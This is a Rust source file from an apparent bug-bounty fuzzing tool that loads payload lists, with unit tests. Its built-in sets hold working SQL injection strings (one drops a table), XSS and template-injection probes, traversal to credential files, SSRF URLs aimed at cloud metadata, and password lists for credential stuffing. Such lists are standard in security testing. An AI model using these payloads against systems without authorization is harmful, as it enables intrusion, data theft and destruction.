/*******************************************************************
 * Filename:        payload.rs
 * Author:          Jeff
 * Date:            2026-05-09
 * Description:     Load payload lists from files or built-in named sets
 * Notes:           Built-in sets are keyed by name prefix; file paths are
 *                  detected by the presence of "/" or the .txt/.csv extension.
 *                  The "numbers:N-M" syntax generates integer ranges on the fly.
 *                  All built-in payloads are tuned for bug bounty; no DoS lists.
 *******************************************************************/

use anyhow::{bail, Result};

// Load a named built-in payload set or a file path
// Dispatch rule: "numbers:N-M" → range, "file:path" or direct path → file, else built-in name
pub fn load(spec: &str) -> Result<Vec<String>> {
    if let Some(range) = spec.strip_prefix("numbers:") {
        return load_range(range);
    }
    let path = spec.strip_prefix("file:").unwrap_or(spec);
    if path.contains('/') || path.ends_with(".txt") || path.ends_with(".csv") {
        return load_file(path);
    }
    load_builtin(spec)
}

// Generate an integer range N-M inclusive as string payloads
fn load_range(spec: &str) -> Result<Vec<String>> {
    let parts: Vec<&str> = spec.splitn(2, '-').collect();
    if parts.len() != 2 {
        bail!("range format must be N-M (e.g. numbers:1-100)");
    }
    let start: i64 = parts[0].trim().parse().map_err(|_| anyhow::anyhow!("invalid range start"))?;
    let end: i64   = parts[1].trim().parse().map_err(|_| anyhow::anyhow!("invalid range end"))?;
    if end < start {
        bail!("range end must be >= start");
    }
    // cap at 10 000 to prevent accidental multi-hour runs
    let count = (end - start + 1).min(10_000);
    Ok((start..start + count).map(|n| n.to_string()).collect())
}

// Read one payload per line from a file; skip blank lines and # comments
fn load_file(path: &str) -> Result<Vec<String>> {
    let raw = std::fs::read_to_string(path)
        .map_err(|e| anyhow::anyhow!("cannot read payload file {path}: {e}"))?;
    Ok(raw.lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .map(String::from)
        .collect())
}

// Return a built-in named payload list; fails with a clear error if name is unknown
fn load_builtin(name: &str) -> Result<Vec<String>> {
    let payloads: &[&str] = match name {
        // SQL injection: classical and blind patterns
        "sqli" => &[
            "'", "''", "' OR '1'='1", "' OR '1'='1'--", "' OR 1=1--",
            "\" OR \"1\"=\"1", "1' AND SLEEP(5)--", "1; DROP TABLE users--",
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "admin'--", "' OR 'x'='x", "1 OR 1=1", "' AND 1=2--",
        ],
        // Cross-site scripting
        "xss" => &[
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
            "';alert(1)//",
            "<iframe src=javascript:alert(1)>",
            "{{7*7}}",  // also catches SSTI
            "${7*7}",
        ],
        // Server-side template injection
        "ssti" => &[
            "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
            "{{config}}", "{{self}}", "${{7*7}}", "{7*7}",
            "{% debug %}", "{{''.__class__.__mro__}}",
        ],
        // Path traversal and LFI
        "traversal" => &[
            "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
            "../../../../etc/passwd", "..%2Fetc%2Fpasswd",
            "%2e%2e%2fetc%2fpasswd", "..\\..\\windows\\win.ini",
            "/etc/passwd", "/etc/shadow", "/proc/self/environ",
            "....//....//etc/passwd",
        ],
        // SSRF test payloads — use with an OOB host
        "ssrf" => &[
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://100.100.100.200/latest/meta-data/",
            "http://localhost/",
            "http://127.0.0.1/",
            "http://[::1]/",
            "file:///etc/passwd",
            "dict://localhost:6379/info",
        ],
        // Common weak passwords for credential stuffing tests
        "common-passwords" => &[
            "password", "123456", "password1", "admin", "letmein",
            "welcome", "monkey", "dragon", "qwerty", "abc123",
            "1234567", "12345678", "sunshine", "princess", "iloveyou",
            "1234567890", "password123", "admin123", "test", "guest",
        ],
        // HTTP methods for verb tampering
        "http-methods" => &[
            "GET", "POST", "PUT", "PATCH", "DELETE",
            "HEAD", "OPTIONS", "TRACE", "CONNECT",
        ],
        // Common admin/API usernames
        "usernames" => &[
            "admin", "administrator", "root", "superuser", "sysadmin",
            "test", "guest", "user", "api", "service", "daemon",
            "manager", "operator", "support",
        ],
        _ => bail!("unknown built-in payload set '{name}'; available: sqli xss ssti traversal ssrf common-passwords http-methods usernames numbers:N-M"),
    };
    Ok(payloads.iter().map(|s| s.to_string()).collect())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn load_range_generates_correct_sequence() {
        let p = load("numbers:1-5").unwrap();
        assert_eq!(p, vec!["1", "2", "3", "4", "5"]);
    }

    #[test]
    fn load_range_caps_at_ten_thousand() {
        let p = load("numbers:1-99999").unwrap();
        assert_eq!(p.len(), 10_000);
    }

    #[test]
    fn load_builtin_sqli_is_nonempty() {
        let p = load("sqli").unwrap();
        assert!(!p.is_empty());
        assert!(p.iter().any(|s| s.contains("OR")));
    }

    #[test]
    fn load_builtin_xss_is_nonempty() {
        let p = load("xss").unwrap();
        assert!(p.iter().any(|s| s.contains("<script>")));
    }

    #[test]
    fn load_unknown_builtin_errors() {
        assert!(load("nonexistent_set").is_err());
    }

    #[test]
    fn load_file_reads_payloads_skipping_comments() {
        let dir = tempfile::tempdir().unwrap();
        let f = dir.path().join("payloads.txt");
        std::fs::write(&f, "# comment\npayload1\n\npayload2\n").unwrap();
        let p = load(f.to_str().unwrap()).unwrap();
        assert_eq!(p, vec!["payload1", "payload2"]);
    }
}
